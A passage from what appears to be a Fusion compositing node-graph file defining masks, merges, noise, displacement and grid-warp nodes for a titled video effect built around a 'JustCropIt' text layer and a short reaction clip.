					Disabled = true,
				},
			},
			ViewInfo = OperatorInfo { Pos = { -1265, -1303.5 } },
		},
		Polygon1Polyline = BezierSpline {
			SplineColor = { Red = 173, Green = 255, Blue = 47 },
			CtrlWZoom = false,
			NameSet = true,
			KeyFrames = {
				[52] = { 0, Flags = { Linear = true, LockedY = true }, Value = Polyline {
						Closed = true,
						Points = {
							{ Linear = true, X = -0.0225561322559013, Y = -0.421556017905555, LX = -2.44779421880355e-05, LY = 0.196225714364504, RX = 0.000253801129597271, RY = -0.00646859623203551 },
							{ X = 0.0022633858002516, Y = -0.432898485418525, LX = -0.0101821089585531, LY = -8.05333565183305e-05, RX = 0.0102448147061822, RY = 8.10293151011865e-05 },
							{ X = 0.0268661804458572, Y = -0.421165121997352, LX = -0.000646266106124636, LY = -0.00704111924528673, RX = -1.96394577735732e-05, RY = 0.196117507794501 },
							{ Linear = true, X = 0.0268072620725365, Y = 0.16718740138615, LX = 1.96394577735732e-05, LY = -0.196117507794501, RX = 0.0971527529976081, RY = 0.000394797776104775 },
							{ Linear = true, X = 0.318265521065361, Y = 0.168371794714464, LX = -0.0971527529976081, LY = -0.000394797776104775, RX = 0.00817208168585589, RY = 1.79832278496732e-05 },
							{ X = 0.333548333401951, Y = 0.181656984826803, LX = -0.000109992306637921, LY = -0.00548916420055179, RX = 0.00011485838929969, RY = 0.00573200597340263 },
							{ X = 0.318820571649871, Y = 0.196071584737218, LX = 0.00644815937085626, LY = -0.00014943018963819, RX = -0.0973522962994224, RY = -1.52890086340858e-05 },
							{ Linear = true, X = 0.0267636827516038, Y = 0.196025717711316, LX = 0.0973522962994224, LY = 1.52890086340858e-05, RX = 2.38428114817842e-05, RY = 0.0421558404785163 },
							{ Linear = true, X = 0.0268352111860491, Y = 0.322493239146865, LX = -2.38428114817842e-05, LY = -0.0421558404785163, RX = 0.081950547016988, RY = -8.27399793834245e-05 },
							{ Linear = true, X = 0.272686852237013, Y = 0.322245019208715, LX = -0.081950547016988, LY = 8.27399793834245e-05, RX = 0.00661227246471889, RY = -8.16079217498978e-06 },
							{ X = 0.291317445514729, Y = 0.336662079311833, LX = -2.33008540105644e-05, LY = -0.00622380594284689, RX = 2.34935487101423e-05, RY = 0.00627527591969171 },
							{ X = 0.272795758564524, Y = 0.351334590263442, LX = 0.00786260941308548, LY = 2.54327964345213e-05, RX = -0.0819484996860601, RY = -4.31174259716653e-06 },
							{ Linear = true, X = 0.0269502595063437, Y = 0.35132165503565, LX = 0.0819484996860601, LY = 4.31174259716653e-06, RX = -8.08482899491055e-06, RY = 0.0105265540103477 },
							{ Linear = true, X = 0.0269260050193589, Y = 0.382901317066694, LX = 8.08482899491055e-06, LY = -0.0105265540103477, RX = -3.13150918427544e-05, RY = 0.00684466252661773 },
							{ X = 0.00302980158087667, Y = 0.39610604312517, LX = 0.0105459608413761, LY = 4.53104541674154e-06, RX = -0.0110152109129415, RY = -4.73265752378923e-06 },
							{ X = -0.0226742448803897, Y = 0.382880006444707, LX = 0.000110802879738832, LY = 0.00785121082019511, RX = 7.22201256724841e-05, RY = -0.0105326651634959 },
							{ Linear = true, X = -0.0224575845033722, Y = 0.351282010954219, LX = -7.22201256724841e-05, LY = 0.0105326651634959, RX = -0.0841468933163282, RY = 7.54048987781456e-06 },
							{ Linear = true, X = -0.274898264452357, Y = 0.351304632423852, LX = 0.0841468933163282, LY = -7.54048987781456e-06, RX = -0.0125868608086487, RY = 0.000209778620013997 },
							{ X = -0.295403482229678, Y = 0.336437008975153, LX = -6.21173462003751e-05, LY = 0.00659594835791692, RX = 6.05779786467841e-05, RY = -0.00643249016936865 },
							{ X = -0.274625960401639, Y = 0.322389948103715, LX = -0.00906432597178292, LY = -1.36946515637932e-05, RX = 0.084017775859324, RY = 2.2554633013964e-05 },
							{ Linear = true, X = -0.0225726328236667, Y = 0.322457612002757, LX = -0.084017775859324, LY = -2.2554633013964e-05, RX = -1.89777529328768e-05, RY = -0.0421313190846291 },
							{ Linear = true, X = -0.0226295660824654, Y = 0.19606365474887, LX = 1.89777529328768e-05, LY = 0.0421313190846291, RX = -0.0978338027541886, RY = -4.37692750693275e-06 },
							{ Linear = true, X = -0.316130974345031, Y = 0.196050523966349, LX = 0.0978338027541886, LY = 4.37692750693275e-06, RX = -0.0134232135501477, RY = -3.13536530718401e-05 },
							{ X = -0.336825834936823, Y = 0.181389276528471, LX = -2.32835229178545e-05, LY = 0.00657136625742586, RX = 2.29787971187836e-05, RY = -0.00648536274151263 },
							{ X = -0.31602852925754, Y = 0.16713719355872, LX = -0.0100116141120582, LY = 3.50345977857642e-05, RX = 0.0977996543916915, RY = -5.35612358735597e-06 },
							{ Linear = true, X = -0.0226295660824654, Y = 0.167121125187958, LX = -0.0977996543916915, LY = 5.35612358735597e-06, RX = 2.44779421880355e-05, RY = -0.196225714364504 }
						}
					} }
			}
		},
		Filter2 = Filter {
			Inputs = {
				FilterType = Input { Value = 1, },
				Alpha = Input { Value = 0, },
				Power = Input { Value = 2, },
				Input = Input {
					SourceOp = ""Background_10"",
					Source = ""Output"",
				},
			},
			ViewInfo = OperatorInfo { Pos = { -1265, -1237.5 } },
		},
		ChangeDepth1 = ChangeDepth {
			Inputs = {
				Depth = Input { Value = 1, },
				Input = Input {
					SourceOp = ""Filter2"",
					Source = ""Output"",
				},
			},
			ViewInfo = OperatorInfo { Pos = { -1100, -1270.5 } },
		},
		Merge3 = Merge {
			Inputs = {
				Background = Input {
					SourceOp = ""transparent1"",
					Source = ""Output"",
				},
				Foreground = Input {
					SourceOp = ""Merge11"",
					Source = ""Output"",
				},
				Center = Input { Value = { 0.503149606299213, 0.439207 }, },
				PerformDepthMerge = Input { Value = 0, },
			},
			ViewInfo = OperatorInfo { Pos = { -1210, -1006.5 } },
		},
		Background_15 = Background {
			NameSet = true,
			Inputs = {
				GlobalOut = Input { Value = 248, },
				Width = Input { Value = 240, },
				Height = Input { Value = 350, },
				Depth = Input { Value = 1, },
				[""Gamut.SLogVersion""] = Input { Value = FuID { ""SLog2"" }, },
				Type = Input { Value = FuID { ""Vertical"" }, },
				TopLeftRed = Input { Value = 1, },
				TopLeftGreen = Input { Value = 1, },
				TopLeftBlue = Input { Value = 1, },
				TopRightRed = Input { Value = 1, },
				TopRightGreen = Input { Value = 1, },
				TopRightBlue = Input { Value = 1, },
				BottomRightGreen = Input { Value = 0.5, },
				BottomRightBlue = Input { Value = 1, },
				Start = Input { Value = { 0.5, 0.5 }, },
				Gradient = Input {
					Value = Gradient {
						Colors = {
							[0] = { 1, 1, 1, 1 },
							[1] = { 0, 0, 0, 1 }
						}
					},
				},
			},
			ViewInfo = OperatorInfo { Pos = { -1045, -907.5 } },
		},
		Merge11 = Merge {
			Inputs = {
				Blend = Input { Value = 0.25, },
				Background = Input {
					SourceOp = ""Merge5"",
					Source = ""Output"",
				},
				Foreground = Input {
					SourceOp = ""Background_15"",
					Source = ""Output"",
				},
				ApplyMode = Input { Value = FuID { ""Overlay"" }, },
				PerformDepthMerge = Input { Value = 0, },
			},
			ViewInfo = OperatorInfo { Pos = { -1045, -1006.5 } },
		},
		transparent1 = BrightnessContrast {
			NameSet = true,
			Inputs = {
				ApplyMaskInverted = Input { Value = 1, },
				Alpha = Input { Value = 1, },
				Gain = Input { Value = 0, },
				Input = Input {
					SourceOp = ""PipeRouter2"",
					Source = ""Output"",
				},
			},
			ViewInfo = OperatorInfo { Pos = { -880, -1204.5 } },
		},
		Rectangle5 = RectangleMask {
			Inputs = {
				Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
				MaskWidth = Input { Value = 1080, },
				MaskHeight = Input { Value = 1080, },
				PixelAspect = Input { Value = { 1, 1 }, },
				UseFrameFormatSettings = Input { Value = 1, },
				ClippingMode = Input { Value = FuID { ""None"" }, },
				Width = Input { Value = 1, },
				Height = Input { Value = 1, },
			},
			ViewInfo = OperatorInfo { Pos = { -880, -907.5 } },
		},
		MediaIn7 = MediaIn {
			ExtentSet = true,
			CustomData = { MEDIA_ID = ""07278263-1d13-461a-ace0-6b87d17cba2d"", MediaProps = { MEDIA_HAS_AUDIO = true, MEDIA_NUM_LAYERS = 1, MEDIA_FORMAT_TYPE = ""QuickTime"", MEDIA_HEIGHT = 1080, MEDIA_PAR = 1, MEDIA_AUDIO_TRACKS_DESC = { { MEDIA_AUDIO_BIT_DEPTH = 32, MEDIA_AUDIO_TRACK_ID = ""07278263-1d13-461a-ace0-6b87d17cba2d"", MEDIA_AUDIO_TRACK_NAME = ""Alison Brie Shocked.mov"", MEDIA_AUDIO_NUM_CHANNELS = 2, MEDIA_AUDIO_START_TIME = 0, MEDIA_AUDIO_SAMPLE_RATE = 48000, MEDIA_AUDIO_FRAME_RATE = 25 } }, MEDIA_NAME = ""Alison Brie Shocked.mov"", MEDIA_START_FRAME = 0, MEDIA_AUDIO_TRACKS_NUM = 1, MEDIA_IS_SOURCE_RES = true, MEDIA_SRC_FRAME_RATE = 25, MEDIA_MARK_OUT = 78, MEDIA_WIDTH = 1080, MEDIA_NUM_FRAMES = 79, MEDIA_MARK_IN = 0, MEDIA_PATH = ""/Users/marcus/Library/CloudStorage/Dropbox/Footage/Alison Brie Shocked.mov"" }, },
			Inputs = {
				GlobalOut = Input { Value = 248, },
				MediaSource = Input { Value = FuID { ""MediaPool"" }, },
				MediaID = Input { Value = ""07278263-1d13-461a-ace0-6b87d17cba2d"", },
				AudioTrack = Input { Value = FuID { ""No_Audo_Track"" }, },
				Layer = Input {
					Value = Text {
					},
				},
				ClipTimeEnd = Input { Value = 78, },
				Loop = Input { Value = 1, },
				[""Gamut.SLogVersion""] = Input { Value = FuID { ""SLog2"" }, },
			},
			ViewInfo = OperatorInfo {
				Pos = { -880, -1138.5 },
				Flags = {
					ShowPic = true
				}
			},
		},
		Text1 = TextPlus {
			Inputs = {
				GlobalOut = Input { Value = 248, },
				Width = Input { Value = 250, },
				Height = Input { Value = 85, },
				[""Gamut.SLogVersion""] = Input { Value = FuID { ""SLog2"" }, },
				LayoutRotation = Input { Value = 1, },
				Red = Input { Value = 0.709803938865662, },
				Green = Input { Value = 0.674509823322296, },
				Blue = Input { Value = 0.639215707778931, },
				Alpha = Input { Value = 1, },
				CharacterSpacing = Input { Value = 0.925, },
				TransformRotation = Input { Value = 1, },
				Red1 = Input { Value = 0.213, },
				Green1 = Input { Value = 0.162519, },
				Blue1 = Input { Value = 0.162519, },
				Softness1 = Input { Value = 1, },
				StyledText = Input { Value = ""JustCropIt"", },
				Font = Input { Value = ""Copperplate"", },
				Style = Input { Value = ""Bold"", },
				Size = Input { Value = 0.2458, },
				VerticalTopCenterBottom = Input { Value = 0.26, },
				VerticalJustificationNew = Input { Value = 3, },
				HorizontalJustificationNew = Input { Value = 3, },
				EffectMask = Input {
					SourceOp = ""Rectangle5"",
					Source = ""Mask"",
				}
			},
			ViewInfo = OperatorInfo {
				Pos = { -880, -874.5 },
				Flags = {
					ShowPic = true
				}
			},
		},
		Merge11_1 = Merge {
			Inputs = {
				Blend = Input { Value = 0.25, },
				Background = Input {
					SourceOp = ""Text1"",
					Source = ""Output"",
				},
				Foreground = Input {
					SourceOp = ""Resize1"",
					Source = ""Output"",
				},
				ApplyMode = Input { Value = FuID { ""Overlay"" }, },
				PerformDepthMerge = Input { Value = 0, },
			},
			ViewInfo = OperatorInfo { Pos = { -1045, -808.5 } },
		},
		Merge4 = Merge {
			Inputs = {
				Background = Input {
					SourceOp = ""Merge3"",
					Source = ""Output"",
				},
				Foreground = Input {
					SourceOp = ""Merge11_1"",
					Source = ""Output"",
				},
				Center = Input { Value = { 0.5, 0.767151 }, },
				PerformDepthMerge = Input { Value = 0, },
			},
			ViewInfo = OperatorInfo { Pos = { -1210, -808.5 } },
		},
		Merge5 = Merge {
			Inputs = {
				Background = Input {
					SourceOp = ""Background_11"",
					Source = ""Output"",
				},
				Foreground = Input {
					SourceOp = ""TimeStretcher1"",
					Source = ""Output"",
				},
				Center = Input { Value = { 0.637637286767362, 0.510289354930406 }, },
				Size = Input { Value = 0.33813100349231, },
				Operator = Input { Value = FuID { ""Atop"" }, },
				PerformDepthMerge = Input { Value = 0, },
			},
			ViewInfo = OperatorInfo { Pos = { -880, -1039.5 } },
		},
		Resize1 = BetterResize {
			Inputs = {
				Width = Input { Value = 250, },
				Height = Input { Value = 85, },
				HiQOnly = Input { Value = 0, },
				PixelAspect = Input { Value = { 1, 1 }, },
				Input = Input {
					SourceOp = ""Background_15"",
					Source = ""Output"",
				},
			},
			ViewInfo = OperatorInfo { Pos = { -1045, -874.5 } },
		},
		TimeStretcher1 = TimeStretcher {
			Inputs = {
				SourceTime = Input { Value = 31, },
				InterpolateBetweenFrames = Input { Value = 0, },
				SampleSpread = Input { Disabled = true, },
				Input = Input {
					SourceOp = ""MediaIn7"",
					Source = ""Output"",
				},
			},
			ViewInfo = OperatorInfo { Pos = { -880, -1072.5 } },
		},
		Background_11 = Background {
			NameSet = true,
			Inputs = {
				GlobalOut = Input { Value = 248, },
				Width = Input { Value = 240, },
				Height = Input { Value = 350, },
				Depth = Input { Value = 1, },
				[""Gamut.SLogVersion""] = Input { Value = FuID { ""SLog2"" }, },
				TopLeftRed = Input { Value = 0.5, },
				TopLeftGreen = Input { Value = 0.5, },
				TopLeftBlue = Input { Value = 0.5, },
				TopRightRed = Input { Value = 1, },
				TopRightGreen = Input { Value = 1, },
				TopRightBlue = Input { Value = 1, },
				BottomLeftRed = Input { Value = 1, },
				BottomLeftGreen = Input { Value = 0.5, },
				BottomRightGreen = Input { Value = 0.5, },
				BottomRightBlue = Input { Value = 1, },
				Start = Input { Value = { 0.5, 0.5 }, },
				Gradient = Input {
					Value = Gradient {
						Colors = {
							[0] = { 1, 1, 1, 1 },
							[1] = { 0, 0, 0, 1 }
						}
					},
				},
			},
			ViewInfo = OperatorInfo { Pos = { -880, -1006.5 } },
		},
		PipeRouter2 = PipeRouter {
			Inputs = {
				Input = Input {
					SourceOp = ""ChangeDepth1"",
					Source = ""Output"",
				},
			},
			ViewInfo = PipeRouterInfo { Pos = { -880, -1270.5 } },
		},
		shading_A = Underlay {
			NameSet = true,
			ViewInfo = UnderlayInfo {
				Pos = { -1058.74, -919.446 },
				Size = { 162.841, 102.97 }
			},
			Colors = { TileColor = { R = 1, G = 0.658823529411765, B = 0.2 }, }
		},
		PipeRouter4 = PipeRouter {
			Inputs = {
				Input = Input {
					SourceOp = ""Merge4"",
					Source = ""Output"",
				},
			},
			ViewInfo = PipeRouterInfo { Pos = { -1155, -775.5 } },
		},
		Blur_1 = Blur {
			NameSet = true,
			Inputs = {
				EffectMask = Input {
					SourceOp = ""Rectangle4"",
					Source = ""Mask"",
				},
				Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
				XBlurSize = Input { Value = 50, },
				Input = Input {
					SourceOp = ""Transform4"",
					Source = ""Output"",
				},
			},
			ViewInfo = OperatorInfo { Pos = { -770, -676.5 } },
		},
		FastNoise1 = FastNoise {
			NameSet = true,
			CurrentSettings = 2,
			CustomData = { Settings = { [1] = { Tools = ordered() { FastNoise1 = FastNoise { Inputs = { YScale = Input { Value = 1.5 }, XScale = Input { Value = 3 }, Width = Input { Value = 484 }, [""Gamut.SLogVersion""] = Input { Value = FuID { ""SLog2"" } }, Height = Input { Value = 760 }, Color1Alpha = Input { Value = 1 }, GlobalOut = Input { Value = 248 }, Angle = Input { Value = -11.4 }, SeetheRate = Input { Value = 0.184 }, LockXY = Input { Value = 0 } }, CtrlWZoom = false, NameSet = true, ViewInfo = OperatorInfo { Pos = { 165, -214.5 } }, CustomData = {
								} } } }, } },
			Inputs = {
				Quality = Input { Value = 4, },
				ShutterAngle = Input { Value = 360, },
				GlobalOut = Input { Value = 248, },
				Width = Input { Value = 484, },
				Height = Input { Value = 760, },
				[""Gamut.SLogVersion""] = Input { Value = FuID { ""SLog2"" }, },
				Center = Input { Value = { 0.741, 0.5 }, },
				LockXY = Input { Value = 0, },
				XScale = Input { Value = 3, },
				YScale = Input { Value = 1.5, },
				Angle = Input { Value = -11.4, },
				Color1Alpha = Input { Value = 1, },
			},
			ViewInfo = OperatorInfo { Pos = { -880, -709.5 } },
		},
		Rectangle1_1 = RectangleMask {
			Inputs = {
				Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
				SoftEdge = Input { Value = 0.0626, },
				MaskWidth = Input { Value = 1080, },
				MaskHeight = Input { Value = 1080, },
				PixelAspect = Input { Value = { 1, 1 }, },
				UseFrameFormatSettings = Input { Value = 1, },
				ClippingMode = Input { Value = FuID { ""None"" }, },
				Center = Input { Value = { 0.507722007722008, 0.745270238782359 }, },
				Width = Input { Value = 1.06628056628057, },
				Height = Input { Value = 0.113461508071094, },
			},
			ViewInfo = OperatorInfo { Pos = { -990, -676.5 } },
		},
		Transform4 = Transform {
			Inputs = {
				Center = Input { Value = { 1, 0.5 }, },
				Edges = Input { Value = 1, },
				Input = Input {
					SourceOp = ""FastNoise1"",
					Source = ""Output"",
				},
			},
			ViewInfo = OperatorInfo { Pos = { -770, -709.5 } },
		},
		Rectangle4 = RectangleMask {
			Inputs = {
				Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
				SoftEdge = Input { Value = 0.1088, },
				MaskWidth = Input { Value = 1080, },
				MaskHeight = Input { Value = 1080, },
				PixelAspect = Input { Value = { 1, 1 }, },
				UseFrameFormatSettings = Input { Value = 1, },
				ClippingMode = Input { Value = FuID { ""None"" }, },
				Width = Input { Value = 0.2, },
				Height = Input { Value = 1.13325740318907, },
			},
			ViewInfo = OperatorInfo { Pos = { -880, -676.5 } },
		},
		small_flag = Underlay {
			NameSet = true,
			ViewInfo = UnderlayInfo {
				Pos = { -881.029, -920.584 },
				Size = { 172.559, 148.108 }
			},
			Colors = { TileColor = { R = 0.886274509803922, G = 0.662745098039216, B = 0.109803921568627 }, }
		},
		big_flag = Underlay {
			NameSet = true,
			ViewInfo = UnderlayInfo {
				Pos = { -880, -1148.02 },
				Size = { 172, 191.213 }
			},
			Colors = { TileColor = { R = 0.92156862745098, G = 0.431372549019608, B = 0 }, }
		},
		Transform3 = Transform {
			Inputs = {
				Quality = Input { Value = 4, },
				ShutterAngle = Input { Value = 360, },
				Center = Input {
					SourceOp = ""Path1"",
					Source = ""Position"",
				},
				Edges = Input { Value = 1, },
				Input = Input {
					SourceOp = ""Blur_1"",
					Source = ""Output"",
				},
			},
			ViewInfo = OperatorInfo { Pos = { -770, -643.5 } },
		},
		Path1 = PolyPath {
			DrawMode = ""InsertAndModify"",
			CtrlWZoom = false,
			Inputs = {
				Displacement = Input {
					SourceOp = ""Path1Displacement"",
					Source = ""Value"",
				},
				PolyLine = Input {
					Value = Polyline {
						Points = {
							{ Linear = true, LockY = true, X = 0, Y = 0, RX = 0.333333333333333, RY = 0 },
							{ Linear = true, LockY = true, X = 1, Y = 0, LX = -0.333333333333333, LY = 0 }
						}
					},
				},
			},
		},
		Path1Displacement = BezierSpline {
			SplineColor = { Red = 255, Green = 0, Blue = 255 },
			CtrlWZoom = false,
			KeyFrames = {
				[0] = { 0, RH = { 33.3333333333333, 0.333333333333333 }, Flags = { LockedY = true } },
				[100] = { 1, LH = { 66.6666666666667, 0.666666666666667 }, Flags = { Linear = true, LockedY = true } }
			}
		},
		Displace1 = Displace {
			Inputs = {
				Type = Input { Value = 1, },
				XOffset = Input { Value = -0.5, },
				XRefraction = Input { Value = 0.02, },
				YOffset = Input { Value = -0.5, },
				YRefraction = Input { Value = 0.04, },
				LightAngle = Input { Value = 84.9, },
				Input = Input {
					SourceOp = ""Merge4"",
					Source = ""Output"",
				},
				Foreground = Input {
					SourceOp = ""BrightnessContrast1_1"",
					Source = ""Output"",
				},
			},
			ViewInfo = OperatorInfo { Pos = { -1155, -544.5 } },
		},
		BrightnessContrast1_1 = BrightnessContrast {
			Inputs = {
				EffectMask = Input {
					SourceOp = ""Rectangle1"",
					Source = ""Mask"",
				},
				ApplyMaskInverted = Input { Value = 1, },
				Contrast = Input { Value = -1, },
				Input = Input {
					SourceOp = ""Transform3"",
					Source = ""Output"",
				},
			},
			ViewInfo = OperatorInfo { Pos = { -880, -643.5 } },
		},
		Merge7 = Merge {
			Inputs = {
				Background = Input {
					SourceOp = ""Displace1"",
					Source = ""Output"",
				},
				Foreground = Input {
					SourceOp = ""Instance_Displace1"",
					Source = ""Output"",
				},
				ApplyMode = Input { Value = FuID { ""LinearLight"" }, },
				Operator = Input { Value = FuID { ""Atop"" }, },
				Gain = Input { Value = 0.25, },
				PerformDepthMerge = Input { Value = 0, },
			},
			ViewInfo = OperatorInfo { Pos = { -880, -544.5 } },
		},
		Rectangle1 = RectangleMask {
			Inputs = {
				EffectMask = Input {
					SourceOp = ""Rectangle1_1"",
					Source = ""Mask"",
				},
				Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
				SoftEdge = Input { Value = 0.0626, },
				MaskWidth = Input { Value = 1080, },
				MaskHeight = Input { Value = 1080, },
				PixelAspect = Input { Value = { 1, 1 }, },
				UseFrameFormatSettings = Input { Value = 1, },
				ClippingMode = Input { Value = FuID { ""None"" }, },
				Center = Input { Value = { 0.507722007722008, 0.384425651867512 }, },
				Width = Input { Value = 1.06628056628057, },
				Height = Input { Value = 0.506242197253433, },
			},
			ViewInfo = OperatorInfo { Pos = { -990, -643.5 } },
		},
		displace_Map = Underlay {
			NameSet = true,
			ViewInfo = UnderlayInfo {
				Pos = { -871.5, -725.021 },
				Size = { 359.28, 141.252 }
			},
			Colors = { TileColor = { R = 0.623529411764706, G = 0.776470588235294, B = 0.0823529411764706 }, }
		},
		Rectangle2_1 = RectangleMask {
			Inputs = {
				Filter = Input { Value = FuID { ""Fast Gaussian"" }, },
				SoftEdge = Input { Value = 0.0095, },
				Invert = Input { Value = 1, },
				MaskWidth = Input { Value = 1080, },
				MaskHeight = Input { Value = 1080, },
				PixelAspect = Input { Value = { 1, 1 }, },
				UseFrameFormatSettings = Input { Value = 1, },
				ClippingMode = Input { Value = FuID { ""None"" }, },
				Center = Input { Value = { 0.5, 0.826332625086293 }, },
				Width = Input { Value = 0.850476190476191, },
				Height = Input { Value = 0.018692693692037, },
			},
			ViewInfo = OperatorInfo { Pos = { -1155, -445.5 } },
		},
		Transform2 = Transform {
			Inputs = {
				Center = Input { Value = { 0.5, 0.477422389463782 }, },
				Input = Input {
					SourceOp = ""GridWarp1"",
					Source = ""Output"",
				},
			},
			ViewInfo = OperatorInfo { Pos = { -660, -445.5 } },
		},
		GridWarp1 = GridWarp {
			SrcDrawMode = 1,
			DestDrawMode = 1,
			CurrentSettings = 2,
			CustomData = { Settings = { [1] = { Tools = ordered() { GridWarp1 = GridWarp { Inputs = { MagnetType = Input { Value = 0 }, SrcYGridSize = Input { Value = 3 }, DstXGridSize = Input { Value = 1 }, DstOverSizeAmount = Input { Value = 0.0500000007450581 }, SrcPolyline = Input { Value = Polyline {
										} }, DstPointTolerance = Input { Value = 0.00999999977648258 }, DstGridChange = Input { Value = Mesh { DeltaR = 0.333333333333333, P1X = -0.5, DeltaC = 1, Count = 8, Col = 2, P1Y = -0.5, Points = { { U = -0.5, V = -0.5, Y = -0.31404958677686, X = -0.395477502295684, Z = 0.0001, B_CX = -0.120283949426167, B_CY = 0.161242055683514, L_CX = 0, T_CY = 0 }, { LinearX = true, U = 0.5, V = -0.5, Y = -0.31404958677686, X = 0.604522497704316, Z = 0.0001, B_CX = -0.0988074427469095, B_CY = 0.164503019498539, R_CX = 0, T_CY = 0 }, { LinearX = true, T_CX = 0.0348408325681053, V = -0.166666666666667, Y = 0.172176308539945, X = -0.5, B_CX = 0.0137741046831956, B_CY = 0.00849403122130412, L_CX = 0, T_CY = -0.162075298438935 }, { LinearX = true, T_CX = 0.0348408325681055, V = -0.166666666666667, Y = 0.172176308539945, X = 0.5, B_CX = 0.0137741046831956, B_CY = 0.00849403122130412, R_CX = 0, T_CY = -0.162075298438935 }, { LinearX = true, U = -0.5, T_CX = -0.0137741046831956, V = 0.166666666666667, Y = 0.197658402203857, X = -0.458677685950413, LinearY = true, Z = 0.0001, B_CX = -0.0439140400976197, B_CY = 0.049778607997786, L_CX = 0, T_CY = -0.00849403122130412 }, { LinearX = true, U = 0.5, T_CX = -0.0137741046831956, V = 0.166666666666667, Y = 0.197658402203857, X = 0.541322314049587, LinearY = true, Z = 0.0001, R_CX = 0, B_CY = 0.0456690189566901, B_CX = -0.0589840078048317, T_CY = -0.00849403122130412 }, { Y = 0.326446280991736, X = -0.5, V = 0.5, LinearX = true, L_CX = 0, B_CY = 0, T_CX = 0.0137741046831956, T_CY = -0.0429292929292929 }, { Y = 0.326446280991736, X = 0.5, V = 0.5, LinearX = true, R_CX = 0, B_CY = 0, T_CX = 0.0137741046831956, T_CY = -0.0429292929292929 } }, SavePoints = {
											} } }, DstSnapDistance = Input { Value = 0.0199999995529652 }, SrcGridChange = Input { Value = Mesh { DeltaR = 0.333333333333333, P1X = -0.5, DeltaC = 1, Count = 8, Col = 2, P1Y = -0.5, Points = { { Y = -0.31404958677686, X = -0.5, V = -0.5, B_CY = 0.162075298438935, L_CX = 0, T_CY = 0 }, { Y = -0.31404958677686, X = 0.5, LinearX = true, V = -0.5, B_CY = 0.162075298438935, R_CX = 0, T_CY = 0 }, { Y = 0.172176308539945, X = -0.5, LinearY = true, LinearX = true, T_CY = -0.162075298438935, B_CY = 0.00849403122130412, L_CX = 0, V = -0.166666666666667 }, { Y = 0.172176308539945, X = 0.5, LinearY = true, LinearX = true, V = -0.166666666666667, B_CY = 0.00849403122130412, R_CX = 0, T_CY = -0.162075298438935 }, { Y = 0.197658402203857, X = -0.5, LinearY = true, LinearX = true, T_CY = -0.00849403122130412, B_CY = 0.0429292929292929, L_CX = 0, V = 0.166666666666667 }, { Y = 0.197658402203857, X = 0.5, LinearY = true, LinearX = true, V = 0.166666666666667, B_CY = 0.0429292929292929, R_CX = 0, T_CY = -0.00849403122130412 }, { Y = 0.326446280991736, X = -0.5, LinearY = true, LinearX = true, T_CY = -0.0429292929292929, B_CY = 0, L_CX = 0, V = 0.5 }, { Y = 0.326446280991736, X = 0.5, LinearY = true, LinearX = true, V = 0.5, B_CY = 0, R_CX = 0, T_CY = -0.0429292929292929 } }, SavePoints = {
											} } }, Input = Input { SourceOp = ""Merge7"", Source = ""Output"" }, SrcXGridSize = Input { Value = 1 }, DstYGridSize = Input { Value = 3 }, DstPolyline = Input { Value = Polyline {
										} } }, SrcDrawMode = 1, CtrlWZoom = false, ViewInfo = OperatorInfo { Pos = { -385, 115.5 } }, CustomData = {
								}, DestDrawMode = 1 } } }, } },
			Inputs = {
				MagnetType = Input { Value = 0, },
				DstXGridSize = Input { Value = 1, },
				DstYGridSize = Input { Value = 3, },
				DstPointTolerance = Input { Value = 0.00999999977648258, },
				DstOverSizeAmount = Input { Value = 0.0500000007450581, },
				DstSnapDistance = Input { Value = 0.0199999995529652, },
				SrcXGridSize = Input { Value = 1, },
				SrcYGridSize = Input { Value = 3, },
				SrcGridChange = Input {
					Value = Mesh {
						Count = 8,
						Col = 2,
						DeltaR = 0.333333333333333,
						DeltaC = 1,
						P1X = -0.5,
						P1Y = -0.5,
						Points = {
							{ X = -0.5, Y = -0.31404958677686, V = -0.5, L_CX = 0, T_CY = 0, B_CY = 0.162075298438935, },
							{ LinearX = true, X = 0.5, Y = -0.31404958677686, V = -0.5, T_CY = 0, R_CX = 0, B_CY = 0.162075298438935, },
							{ LinearX = true, LinearY = true, X = -0.5, Y = 0.172176308539945, V = -0.166666666666667, L_CX = 0, T_CY = -0.162075298438935, B_CY = 0.00849403122130412, },
							{ LinearX = true, LinearY = true, X = 0.5, Y = 0.172176308539945, V = -0.166666666666667, T_CY = -0.162075298438935, R_CX = 0, B_CY = 0.00849403122130412, },
							{ LinearX = true, LinearY = true, X = -0.5, Y = 0.197658402203857, V = 0.166666666666667, L_CX = 0, T_CY = -0.00849403122130412, B_CY = 0.0429292929292929, },
							{ LinearX = true, LinearY = true, X = 0.5, Y = 0.197658402203857, V = 0.166666666666667, T_CY = -0.00849403122130412, R_CX = 0, B_CY = 0.0429292929292929, },
							{ LinearX = true, LinearY = true, X = -0.5, Y = 0.326446280991736, V = 0.5, L_CX = 0, T_CY = -0.0429292929292929, B_CY = 0, },
							{ LinearX = true, LinearY = true, X = 0.5, Y = 0.326446280991736, V = 0.5, T_CY = -0.0429292929292929, R_CX = 0, B_CY = 0, }
						},
						SavePoints = {
						}
					},
				},
				SrcPolyline = Input {
					Value = Polyline {
					},
				},
				DstGridChange = Input {
					SourceOp = ""GridWarp1DstGridChange"",
					Source = ""Value"",
				},
				DstPolyline = Input {
					Value = Polyline {
					},
				},
				Input = Input {
					SourceOp = ""Merge7"",
					Source = ""Output"",
				},
			},
			ViewInfo = OperatorInfo { Pos = { -880, -478.5 } },
		},
		GridWarp1DstGridChange = BezierSpline {
			SplineColor = { Red = 119, Green = 221, Blue = 102 },
			CtrlWZoom = false,
			KeyFrames = {
				[0] = { 0, RH = { 16.6666666666667, 0 }, Flags = { Linear = true, LockedY = true }, Value = Mesh {
						Count = 8,
						Col = 2,
						DeltaR = 0.333333333333333,
						DeltaC = 1,
						P1X = -0.5,
						P1Y = -0.5,
						Points = {
							{ X = -0.395477502295684, Y = -0.31404958677686, Z = 0.0001, U = -0.5, V = -0.5, L_CX = 0, T_CY = 0, B_CX = -0.120283949426167, B_CY = 0.161242055683514, },
							{ LinearX = true, X = 0.604522497704316, Y = -0.31404958677686, Z = 0.0001, U = 0.5, V = -0.5, T_CY = 0, R_CX = 0, B_CX = -0.0988074427469095, B_CY = 0.164503019498539, },
